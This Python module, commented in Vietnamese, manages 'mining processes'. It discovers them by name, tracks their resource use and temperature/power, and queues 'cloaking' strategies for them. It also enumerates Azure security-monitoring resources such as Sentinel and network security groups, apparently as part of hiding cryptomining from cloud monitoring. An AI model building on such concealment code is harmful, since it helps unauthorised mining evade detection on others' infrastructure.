# resource_manager.py

import logging
import psutil
import pynvml
import traceback
import asyncio
from asyncio import Queue as AsyncQueue, Event
from typing import List, Any, Dict, Optional, Tuple
from itertools import count
from contextlib import asynccontextmanager

import aiofiles
import aiorwlock

from .utils import MiningProcess
from .cloak_strategies import CloakStrategyFactory
from .resource_control import ResourceControlFactory

from .azure_clients import (
    AzureSentinelClient,
    AzureLogAnalyticsClient,
    AzureNetworkWatcherClient,
    AzureAnomalyDetectorClient
)

from .auxiliary_modules.interfaces import IResourceManager
from .auxiliary_modules.models import ConfigModel
from .auxiliary_modules.event_bus import EventBus
from .auxiliary_modules import temperature_monitor
from .auxiliary_modules.power_management import (
    PowerManager,
    get_cpu_power,
    get_gpu_power,
    set_gpu_usage,
    shutdown_power_management
)

###############################################################################
#                      HÀM HỖ TRỢ CHIẾM KHÓA (LOCK) W/ TIMEOUT               #
###############################################################################
@asynccontextmanager
async def acquire_lock_with_timeout(lock, lock_type: str, timeout: float, retries: int = 3):
    """
    Hàm hỗ trợ chiếm lock đọc/ghi với thời gian chờ (timeout) + số lần retry.
    Nếu sau 'retries' lần vẫn không acquire được => yield None.
    """
    if lock_type == 'read':
        lock_to_acquire = lock.reader_lock
    elif lock_type == 'write':
        lock_to_acquire = lock.writer_lock
    else:
        raise ValueError("lock_type phải là 'read' hoặc 'write'.")

    acquired = False
    for attempt in range(retries):
        try:
            await asyncio.wait_for(lock_to_acquire.acquire(), timeout=timeout)
            acquired = True
            break
        except asyncio.TimeoutError:
            logging.warning(f"Timeout khi chiếm lock {lock_type}, thử lại ({attempt + 1}/{retries}).")

    if not acquired:
        logging.error(f"Không thể chiếm lock {lock_type} sau {retries} lần thử.")
        yield None
        return

    try:
        yield lock_to_acquire
    finally:
        if acquired:
            try:
                await lock_to_acquire.release()
            except RuntimeError as e:
                if "Cannot release an un-acquired lock" in str(e):
                    logging.warning(
                        "Bỏ qua lỗi 'Cannot release an un-acquired lock' do hủy coroutine "
                        "hoặc race condition cạnh tranh lock."
                    )
                else:
                    raise

###############################################################################
#              LỚP QUẢN LÝ TÀI NGUYÊN CHUNG: SharedResourceManager            #
###############################################################################
class SharedResourceManager:
    def __init__(self, config: ConfigModel, logger: logging.Logger, resource_managers: Dict[str, Any]):
        self.logger = logger
        self.logger.info("Khởi tạo SharedResourceManager... (BẮT ĐẦU)")
        try:
            self.config = config
            self.resource_managers = resource_managers
            self.power_manager = PowerManager()
            self.strategy_cache = {}

            self.logger.debug(f"SharedResourceManager: resource_managers={self.resource_managers}")

            self._nvml_init = False
            self.logger.debug("SharedResourceManager: Gọi self.initialize_nvml()")
            self.initialize_nvml()
            self.logger.info("SharedResourceManager đã được khởi tạo thành công.")
        except Exception as e:
            self.logger.error(f"Lỗi khi khởi tạo SharedResourceManager: {e}\n{traceback.format_exc()}")
            raise RuntimeError("Không thể khởi tạo SharedResourceManager.") from e
        finally:
            self.logger.info("Khởi tạo SharedResourceManager... (KẾT THÚC)")

    def is_nvml_initialized(self) -> bool:
        return self._nvml_init

    def initialize_nvml(self):
        if not self._nvml_init:
            try:
                pynvml.nvmlInit()
                self._nvml_init = True
                self.logger.info("NVML đã được khởi tạo thành công.")
            except pynvml.NVMLError_LibraryNotFound:
                self.logger.error("Thư viện NVML không tìm thấy. Vui lòng kiểm tra container.")
                raise
            except pynvml.NVMLError_InsufficientPermissions:
                self.logger.error("Không đủ quyền truy cập NVML. Kiểm tra quyền GPU.")
                raise
            except pynvml.NVMLError as e:
                self.logger.error(f"Lỗi NVML không xác định: {e}")
                raise

    async def shutdown_nvml(self):
        if self._nvml_init:
            try:
                pynvml.nvmlShutdown()
                self._nvml_init = False
                self.logger.debug("Đã shutdown NVML thành công.")
            except pynvml.NVMLError as e:
                self.logger.error(f"Lỗi khi shutdown NVML: {e}")

    ###########################################################################
    #                    HÀM LẤY THÔNG TIN SỬ DỤNG TÀI NGUYÊN (async)         #
    ###########################################################################
    async def get_process_cache_usage(self, pid: int) -> float:
        """
        Đọc /proc/[pid]/status => VmCache => tính % so với total RAM.
        """
        try:
            status_file = f"/proc/{pid}/status"
            async with aiofiles.open(status_file, 'r') as f:
                async for line in f:
                    if line.startswith("VmCache:"):
                        cache_kb = int(line.split()[1])
                        total_mem_kb = psutil.virtual_memory().total / 1024
                        cache_percent = (cache_kb / total_mem_kb) * 100
                        self.logger.debug(f"PID={pid} sử dụng cache: {cache_percent:.2f}%")
                        return cache_percent
            self.logger.warning(f"Không tìm thấy VmCache cho PID={pid}.")
            return 0.0
        except FileNotFoundError:
            self.logger.error(f"Không tìm thấy tiến trình với PID={pid} khi lấy cache.")
            return 0.0
        except Exception as e:
            self.logger.error(f"Lỗi get_process_cache_usage(PID={pid}): {e}\n{traceback.format_exc()}")
            return 0.0

    async def get_gpu_usage_percent(self, pid: int) -> float:
        """
        Tỷ lệ sử dụng GPU (nvidia) của pid. Gọi hàm đồng bộ `_sync_get_gpu_usage_percent`.
        """
        try:
            loop = asyncio.get_event_loop()
            gpu_usage = await loop.run_in_executor(None, self._sync_get_gpu_usage_percent, pid)
            self.logger.debug(f"PID={pid} GPU usage: {gpu_usage}%")
            return gpu_usage
        except Exception as e:
            self.logger.error(f"Lỗi bất ngờ trong get_gpu_usage_percent: {e}\n{traceback.format_exc()}")
            return 0.0

    def _sync_get_gpu_usage_percent(self, pid: int) -> float:
        try:
            if not self.is_nvml_initialized():
                self.logger.debug("_sync_get_gpu_usage_percent: NVML chưa init => init.")
                self.initialize_nvml()

            if not self._nvml_init:
                return 0.0

            device_count = pynvml.nvmlDeviceGetCount()
            total_gpu_usage = 0.0
            gpu_present = False

            for i in range(device_count):
                handle = pynvml.nvmlDeviceGetHandleByIndex(i)
                procs = pynvml.nvmlDeviceGetComputeRunningProcesses(handle)
                for proc in procs:
                    if proc.pid == pid:
                        gpu_present = True
                        utilization = pynvml.nvmlDeviceGetUtilizationRates(handle)
                        total_gpu_usage += utilization.gpu

            return total_gpu_usage if gpu_present else 0.0
        except pynvml.NVMLError as e:
            self.logger.error(f"Lỗi khi thu thập GPU usage: {e}")
            return 0.0
        except Exception as e:
            self.logger.error(f"Lỗi không xác định trong _sync_get_gpu_usage_percent: {e}\n{traceback.format_exc()}")
            return 0.0

    ##########################################################################
    #                    CLOAK / RESTORE CHIẾN LƯỢC TÀI NGUYÊN                #
    ##########################################################################
    def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
        try:
            pid = process.pid
            name = process.name
            self.logger.debug(f"Tạo strategy '{strategy_name}' cho {name} (PID={pid})")
            strategy = CloakStrategyFactory.create_strategy(
                strategy_name,
                self.config,
                self.logger,
                self.resource_managers
            )
            if not strategy or not callable(getattr(strategy, 'apply', None)):
                self.logger.error(f"Chiến lược '{strategy_name}' không khả dụng.")
                return

            self.logger.info(f"Bắt đầu áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid})")
            strategy.apply(process)
            self.logger.info(f"Hoàn thành áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid}).")
        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền áp dụng cloaking '{strategy_name}' cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi cloaking '{strategy_name}' cho {name} (PID={pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    async def restore_resources(self, process: MiningProcess):
        """
        Khôi phục tài nguyên (CPU, GPU...) cho tiến trình đã cloaked.
        """
        try:
            pid = process.pid
            name = process.name
            restored = False

            for controller_name, manager in self.resource_managers.items():
                success = await manager.restore_resources(pid)
                if success:
                    self.logger.info(f"Đã khôi phục tài nguyên '{controller_name}' cho PID={pid}.")
                    restored = True
                else:
                    self.logger.error(f"Không thể khôi phục tài nguyên '{controller_name}' cho PID={pid}.")

            if restored:
                self.logger.info(f"Khôi phục xong tài nguyên cho {name} (PID={pid}).")
            else:
                self.logger.warning(f"Không tìm thấy tài nguyên nào cần khôi phục cho {name} (PID={pid}).")
        except psutil.NoSuchProcess:
            self.logger.error(f"Tiến trình PID={process.pid} không tồn tại khi khôi phục tài nguyên.")
        except psutil.AccessDenied:
            self.logger.error(f"Không đủ quyền khôi phục tài nguyên cho PID={process.pid}.")
        except Exception as e:
            self.logger.error(f"Lỗi khi khôi phục tài nguyên cho {name} (PID={pid}): {e}\n{traceback.format_exc()}")
            raise

###############################################################################
#                  LỚP ResourceManager (SINGLETON)                            #
###############################################################################
class ResourceManager(IResourceManager):
    """
    Quản lý tài nguyên hệ thống (CPU, RAM, GPU, Network...), watchers event-driven.
    """

    _instance = None
    _instance_lock = asyncio.Lock()

    def __new__(cls, config: ConfigModel, event_bus: EventBus, logger: logging.Logger):
        if not hasattr(cls, '_instance') or cls._instance is None:
            cls._instance = super(ResourceManager, cls).__new__(cls)
        return cls._instance

    def __init__(self, config: ConfigModel, event_bus: EventBus, logger: logging.Logger):
        if hasattr(self, '_initialized') and self._initialized:
            return

        self._initialized = True
        self.logger = logger
        self.config = config
        self.event_bus = event_bus
        self.stop_event = asyncio.Event()

        self.resource_lock = aiorwlock.RWLock()
        self.resource_adjustment_queue = AsyncQueue()

        self.mining_processes: List[MiningProcess] = []
        self.mining_processes_lock = aiorwlock.RWLock()

        self._counter = count()
        self.watchers = []

        self.shared_resource_manager: Optional[SharedResourceManager] = None

        self.logger.info("ResourceManager.__init__ (BẮT ĐẦU)")
        try:
            self.event_bus.subscribe('resource_adjustment', self.handle_resource_adjustment)
            self.logger.info("ResourceManager.__init__ (KẾT THÚC)")
        except Exception as e:
            self.logger.error(f"Lỗi trong ResourceManager.__init__: {e}\n{traceback.format_exc()}")
            raise RuntimeError("Không thể khởi tạo ResourceManager.") from e

    async def start(self):
        self.logger.info("ResourceManager.start() - BẮT ĐẦU")
        try:
            self.logger.info("Tạo resource_managers từ ResourceControlFactory...")
            resource_managers = await ResourceControlFactory.create_resource_managers(
                config=self.config,
                logger=self.logger
            )

            if not resource_managers:
                raise RuntimeError("Không thể tạo ResourceControlFactory managers (None hoặc rỗng).")

            self.logger.info("Khởi tạo SharedResourceManager...")
            self.shared_resource_manager = SharedResourceManager(self.config, self.logger, resource_managers)
            if not self.shared_resource_manager:
                raise RuntimeError("SharedResourceManager không được khởi tạo.")

            self.logger.info("Gọi initialize_azure_clients()...")
            self.initialize_azure_clients()

            self.logger.info("Khám phá tài nguyên Azure...")
            self.discover_azure_resources()

            self.logger.info("Bắt đầu khởi tạo watchers...")
            await self.start_watchers()

            self.logger.info("ResourceManager đã khởi động thành công.")
            self.logger.info("ResourceManager.start() - KẾT THÚC")
        except Exception as e:
            self.logger.error(f"Lỗi khi khởi động ResourceManager: {e}\n{traceback.format_exc()}")
            await self.shutdown()
            raise

    def initialize_azure_clients(self):
        self.logger.debug("ResourceManager.initialize_azure_clients: Bắt đầu tạo Azure Clients.")
        self.azure_sentinel_client = AzureSentinelClient(self.logger)
        self.azure_log_analytics_client = AzureLogAnalyticsClient(self.logger)
        self.azure_network_watcher_client = AzureNetworkWatcherClient(self.logger)
        self.azure_anomaly_detector_client = AzureAnomalyDetectorClient(self.logger, self.config.to_dict())
        self.logger.debug("ResourceManager.initialize_azure_clients: Tạo Azure Clients thành công.")

    def discover_azure_resources(self):
        try:
            net_watchers = self.azure_network_watcher_client.discover_resources('Microsoft.Network/networkWatchers')
            self.network_watchers = net_watchers
            self.logger.info(f"Khám phá {len(net_watchers)} Network Watchers.")

            nsgs = self.azure_network_watcher_client.discover_resources('Microsoft.Network/networkSecurityGroups')
            self.nsgs = nsgs
            self.logger.info(f"Khám phá {len(nsgs)} NSGs.")

            self.logger.info("Khám phá Traffic Analytics Workspaces (nếu có).")
        except Exception as e:
            self.logger.error(f"Lỗi khám phá Azure: {e}\n{traceback.format_exc()}")

    async def is_gpu_initialized(self) -> bool:
        if self.shared_resource_manager:
            return self.shared_resource_manager.is_nvml_initialized()
        return False

    async def restore_resources(self, process: MiningProcess) -> bool:
        try:
            if self.shared_resource_manager:
                await self.shared_resource_manager.restore_resources(process)
                return True
            return False
        except Exception as e:
            self.logger.error(f"Lỗi restore_resources PID={process.pid}: {e}\n{traceback.format_exc()}")
            return False

    # ============= watchers / concurrency =============
    async def discover_mining_processes_async(self):
        """
        Tìm tiến trình CPU/GPU => self.mining_processes.
        """
        try:
            cpu_name = self.config.processes.get('CPU', '').lower()
            gpu_name = self.config.processes.get('GPU', '').lower()

            async with acquire_lock_with_timeout(self.mining_processes_lock, 'write', timeout=5) as write_lock:
                if write_lock is None:
                    self.logger.error("Timeout khi acquire lock discover_mining_processes.")
                    return

                self.mining_processes.clear()
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        pname = proc.info['name'].lower()
                        if cpu_name in pname or gpu_name in pname:
                            prio = self.get_process_priority(proc.info['name'])
                            net_if = self.config.network_interface
                            mproc = MiningProcess(proc.info['pid'], proc.info['name'], prio, net_if, self.logger)
                            self.mining_processes.append(mproc)
                            self.logger.debug(f"Discovered mining process: {mproc}")
                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        continue
                self.logger.info(f"Khám phá {len(self.mining_processes)} tiến trình khai thác.")
        except Exception as e:
            self.logger.error(f"Lỗi discover_mining_processes_async: {e}\n{traceback.format_exc()}")

    def get_process_priority(self, process_name: str) -> int:
        priority_map = self.config.process_priority_map
        pri_val = priority_map.get(process_name.lower(), 1)
        if not isinstance(pri_val, int):
            self.logger.warning(f"Priority cho '{process_name}' không phải int => gán=1.")
            return 1
        return pri_val

    async def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
        """
        Thu thập metric => { 'cpu_usage':..., 'gpu_usage':..., 'cache_usage':..., 'network_usage', 'memory_usage' }.
        """
        try:
            if not psutil.pid_exists(process.pid):
                self.logger.warning(f"PID={process.pid} không tồn tại.")
                return {}
            proc_obj = psutil.Process(process.pid)
            cpu_pct = proc_obj.cpu_percent(interval=1)
            mem_mb = proc_obj.memory_info().rss / (1024**2)

            gpu_pct = 0.0
            if await self.is_gpu_initialized():
                gpu_pct = await self.shared_resource_manager.get_gpu_usage_percent(process.pid)

            disk_mbps = await temperature_monitor.get_current_disk_io_limit(process.pid)
            cache_l = await self.shared_resource_manager.get_process_cache_usage(process.pid)

            metrics = {
                'cpu_usage': float(cpu_pct),
                'memory_usage': float(mem_mb),
                'gpu_usage': float(gpu_pct),
                'network_usage': float(disk_mbps),
                'cache_usage': float(cache_l),
            }
            self.logger.debug(f"Metrics PID={process.pid}: {metrics}")
            return metrics
        except Exception as e:
            self.logger.error(f"Lỗi collect_metrics PID={process.pid}: {e}")
            return {}

    async def collect_all_metrics(self) -> Dict[str, Any]:
        """
        Thu thập metrics cho TẤT CẢ mining_processes => { pid: {...}, ... }.
        """
        metrics_data = {}
        try:
            async with acquire_lock_with_timeout(self.mining_processes_lock, 'write', timeout=5) as lock_ctx:
                if lock_ctx is None:
                    self.logger.error("Timeout lock collect_all_metrics.")
                    return metrics_data

                tasks = [self.collect_metrics(p) for p in self.mining_processes]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                for proc, res in zip(self.mining_processes, results):
                    if isinstance(res, Exception):
                        self.logger.error(f"Lỗi collect metrics PID={proc.pid}: {res}")
                    elif isinstance(res, dict) and res:
                        metrics_data[str(proc.pid)] = res
                    else:
                        self.logger.warning(f"Không có metrics hợp lệ cho PID={proc.pid}")
                self.logger.debug(f"Dữ liệu metrics đã thu thập: {metrics_data}")
        except Exception as e:
            self.logger.error(f"Lỗi collect_all_metrics: {e}\n{traceback.format_exc()}")
        return metrics_data

    async def handle_resource_adjustment(self, task: Dict[str, Any]):
        """ Nhận event 'resource_adjustment' => put vào queue. """
        try:
            await self.resource_adjustment_queue.put(task)
            self.logger.info(
                f"Đã nhận sự kiện: {task['type']} cho PID={task.get('process').pid if 'process' in task else 'N/A'}"
            )
        except Exception as e:
            self.logger.error(f"Lỗi handle_resource_adjustment: {e}\n{traceback.format_exc()}")

    async def enqueue_cloaking(self, process: MiningProcess):
        """ Yêu cầu cloak => add task vào resource_adjustment_queue. """
        try:
            task = {
                'type': 'cloaking',
                'process': process,
                'strategies': ['cpu', 'gpu', 'cache', 'network', 'memory', 'disk_io']
            }
            priority = 1
            count_val = next(self._counter)
            await self.resource_adjustment_queue.put((priority, count_val, task))
            self.logger.info(f"Đã enqueue cloaking cho PID={process.pid}.")
        except Exception as e:
            self.logger.error(f"Không thể enqueue cloaking PID={process.pid}: {e}\n{traceback.format_exc()}")

    async def enqueue_restoration(self, process: MiningProcess):
        """ Yêu cầu restore => add task vào resource_adjustment_queue. """
        try:
            task = {
                'type': 'restoration',
                'process': process
            }
            priority = 2
            count_val = next(self._counter)
            await self.resource_adjustment_queue.put((priority, count_val, task))
            self.logger.info(f"Đã enqueue khôi phục cho PID={process.pid}.")
        except Exception as e:
            self.logger.error(f"Không thể enqueue restoration PID={process.pid}: {e}\n{traceback.format_exc()}")

    async def process_resource_adjustments(self):
        """
        Worker loop => dequeue => apply cloaking / restoration strategies.
        """
        while not self.stop_event.is_set():
            try:
                priority, count_val, task = await asyncio.wait_for(self.resource_adjustment_queue.get(), timeout=1)
                if task['type'] == 'cloaking':
                    # Cloaking => apply each strategy
                    for strat in task['strategies']:
                        if strat not in self.shared_resource_manager.strategy_cache:
                            strat_inst = CloakStrategyFactory.create_strategy(
                                strat, self.config, self.logger,
                                self.shared_resource_manager.resource_managers
                            )
                            self.shared_resource_manager.strategy_cache[strat] = strat_inst
                            self.logger.debug(f"Created strategy '{strat}'.")
                        else:
                            strat_inst = self.shared_resource_manager.strategy_cache[strat]

                        if strat_inst and callable(getattr(strat_inst, 'apply', None)):
                            self.logger.info(f"Áp dụng '{strat}' cho PID={task['process'].pid}.")
                            strat_inst.apply(task['process'])
                            self.logger.info(f"Áp dụng xong '{strat}' cho PID={task['process'].pid}.")
                        else:
                            self.logger.error(f"Không thể áp dụng strategy '{strat}' cho PID={task['process'].pid}.")

                elif task['type'] == 'restoration':
                    # Restore => shared_resource_manager.restore_resources
                    self.logger.info(f"Đang khôi phục tài nguyên cho PID={task['process'].pid}.")
                    await self.shared_resource_manager.restore_resources(task['process'])
                    self.logger.info(f"Đã khôi phục cho PID={task['process'].pid}.")

                self.resource_adjustment_queue.task_done()

            except asyncio.TimeoutError:
                # Queue empty => chờ 1 giây
                continue
            except Exception as e:
                self.logger.error(f"Lỗi process_resource_adjustments: {e}\n{traceback.format_exc()}")

    ##########################################################################
    #                    WATCHERS: NHIỆT ĐỘ, CÔNG SUẤT, ETC.                 #
    ##########################################################################
    async def temperature_watcher(self):
        """
        Giám sát nhiệt độ CPU/GPU => nếu vượt => enqueue_cloaking.
        """
        mon_params = self.config.monitoring_parameters
        temp_intv = mon_params.get("temperature_monitoring_interval_seconds", 60)
        temp_lims = self.config.temperature_limits
        cpu_max_temp = temp_lims.get("cpu_max_celsius", 75)
        gpu_max_temp = temp_lims.get("gpu_max_celsius", 85)

        retry_delay = 1
        while not self.stop_event.is_set():
            try:
                # Lấy lock => discover process
                await self.discover_mining_processes_async()

                # lock read => check temperature
                async with acquire_lock_with_timeout(self.mining_processes_lock, 'read', 5) as read_lock:
                    if read_lock is None:
                        self.logger.warning("Timeout lock => temperature_watcher.")
                        retry_delay = min(retry_delay * 2, 60)
                        await asyncio.sleep(retry_delay)
                        continue

                    tasks = [self.check_temperature_and_enqueue(p, cpu_max_temp, gpu_max_temp)
                             for p in self.mining_processes]
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    for r in results:
                        if isinstance(r, Exception):
                            self.logger.error(f"Lỗi check_temperature_and_enqueue: {r}")

                    retry_delay = 1
            except asyncio.CancelledError:
                self.logger.info("Watcher bị hủy (temperature_watcher).")
                break
            except Exception as e:
                self.logger.error(f"Lỗi temperature_watcher: {e}\n{traceback.format_exc()}")

            await asyncio.sleep(temp_intv)

    async def check_temperature_and_enqueue(self, process: MiningProcess, cpu_max_temp: int, gpu_max_temp: int):
        try:
            cpu_temp = await temperature_monitor.get_cpu_temperature()
            g_temps = await temperature_monitor.get_gpu_temperature() if await self.is_gpu_initialized() else []
            if not isinstance(g_temps, (list, tuple)):
                g_temps = [g_temps]

            if cpu_temp > cpu_max_temp:
                self.logger.warning(f"Nhiệt độ CPU {cpu_temp}°C > {cpu_max_temp}°C (PID={process.pid}).")
                await self.enqueue_cloaking(process)

            if any(t > gpu_max_temp for t in g_temps):
                self.logger.warning(f"Nhiệt độ GPU {g_temps}°C > {gpu_max_temp}°C (PID={process.pid}).")
                await self.enqueue_cloaking(process)
        except Exception as e:
            self.logger.error(f"check_temperature_and_enqueue PID={process.pid}: {e}\n{traceback.format_exc()}")

    async def power_watcher(self):
        """
        Giám sát công suất CPU/GPU => enqueue_cloaking nếu vượt.
        """
        mon_params = self.config.monitoring_parameters
        power_intv = mon_params.get("power_monitoring_interval_seconds", 60)
        power_limits = self.config.power_limits
        per_dev_power = power_limits.get("per_device_power_watts", {})
        cpu_max_pwr = per_dev_power.get("cpu", 150)
        gpu_max_pwr = per_dev_power.get("gpu", 300)

        consecutive_errors = 0
        while not self.stop_event.is_set():
            try:
                await self.discover_mining_processes_async()

                acquired = False
                for _ in range(3):
                    async with acquire_lock_with_timeout(self.mining_processes_lock, 'read', 5) as read_lock:
                        if read_lock:
                            acquired = True
                            break
                        else:
                            self.logger.warning("Retrying lock => power_watcher...")
                            await asyncio.sleep(1)

                if not acquired:
                    self.logger.error("Timeout lock => power_watcher (3 lần).")
                    continue

                tasks = [self.check_power_and_enqueue(p, cpu_max_pwr, gpu_max_pwr)
                         for p in self.mining_processes]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                for r in results:
                    if isinstance(r, Exception):
                        self.logger.error(f"Lỗi check_power_and_enqueue: {r}")

                consecutive_errors = 0
            except asyncio.CancelledError:
                self.logger.info("Watcher bị hủy (power_watcher).")
                break
            except Exception as e:
                consecutive_errors += 1
                self.logger.error(f"Lỗi power_watcher: {e}\n{traceback.format_exc()}")
                if consecutive_errors >= 5:
                    self.logger.critical("Lỗi liên tiếp power_watcher => ngủ 60s.")
                    await asyncio.sleep(60)
            await asyncio.sleep(power_intv)

    async def check_power_and_enqueue(self, process: MiningProcess, cpu_max_power: int, gpu_max_power: int):
        try:
            loop = asyncio.get_event_loop()
            c_power = await loop.run_in_executor(None, get_cpu_power, process.pid)
            g_power = await loop.run_in_executor(None, get_gpu_power, process.pid)

            if isinstance(g_power, list):
                total_g_power = sum(g_power)
                if total_g_power > gpu_max_power:
                    self.logger.warning(f"GPU={total_g_power}W > {gpu_max_power}W => cloak (PID={process.pid}).")
                    await self.enqueue_cloaking(process)
            elif g_power and g_power > gpu_max_power:
                self.logger.warning(f"GPU={g_power}W > {gpu_max_power}W => cloak (PID={process.pid}).")
                await self.enqueue_cloaking(process)

            if c_power and c_power > cpu_max_power:
                self.logger.warning(f"CPU={c_power}W > {cpu_max_power}W => cloak (PID={process.pid}).")
                await self.enqueue_cloaking(process)
        except Exception as e:
            self.logger.error(f"check_power_and_enqueue PID={process.pid}: {e}\n{traceback.format_exc()}")

    ##########################################################################
    #                      START WATCHERS & SHUTDOWN                          #
    ##########################################################################
    async def start_watchers(self):
        self.logger.debug("ResourceManager.start_watchers: Tạo watchers tasks.")
        try:
            self.watchers.append(asyncio.create_task(self.temperature_watcher()))
            self.watchers.append(asyncio.create_task(self.power_watcher()))
            self.watchers.append(asyncio.create_task(self.process_resource_adjustments()))
            self.logger.info("Đã khởi tạo watchers (temperature, power) + queue consumer.")
        except Exception as e:
            self.logger.error(f"Lỗi start_watchers: {e}\n{traceback.format_exc()}")
            raise

    async def shutdown(self):
        """
        Dừng ResourceManager => hủy watchers => shutdown NVML => restore resources => done
        """
        self.logger.info("Dừng ResourceManager... (BẮT ĐẦU)")
        self.stop_event.set()

        # Cancel watchers
        for w in self.watchers:
            w.cancel()
        await asyncio.gather(*self.watchers, return_exceptions=True)

        # Chờ queue trống
        await asyncio.sleep(1)

        # Tắt NVML
        if self.shared_resource_manager:
            await self.shared_resource_manager.shutdown_nvml()

        # Restore resources => lock read => restore all
        if self.shared_resource_manager:
            tasks = []
            async with acquire_lock_with_timeout(self.mining_processes_lock, 'read', 5) as read_lock:
                if read_lock:
                    for proc in self.mining_processes:
                        tasks.append(self.shared_resource_manager.restore_resources(proc))
            await asyncio.gather(*tasks, return_exceptions=True)

        self.logger.info("ResourceManager đã dừng. (KẾT THÚC)")
